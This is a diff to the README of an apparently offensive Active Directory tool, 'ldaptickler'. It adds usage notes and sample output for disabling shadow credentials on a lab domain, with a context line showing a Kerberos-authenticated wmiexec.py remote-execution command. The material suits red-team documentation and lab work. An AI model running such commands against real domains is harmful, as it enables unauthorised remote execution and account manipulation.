@@ -340,7 +340,22 @@ go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u 
     wmiexec.py -k -no-pass spinninglikea.top/<HOSTNAME>
 ```
 
-
+### Disable shadow credentials
+```
+-d = specify the domain
+--dc = specify the domain controller
+-p = prompt for password
+-u = username
+-s = skip cert verification
+```
+```
+go run ./cmd/ldaptickler/ -d spinninglikea.top --dc tip.spinninglikea.top -s -u slacker -p disableshadowcredential slacker
+[+] Enter Password: 
+[+] Attempting NTLM bind to tip.spinninglikea.top
+[+] Successfully connected to tip.spinninglikea.top
+[+] Disabling shadow credentials for account slacker
+[+] Successfully disabled shadow credentials for account slacker
+```
 
 
 ## Initial features
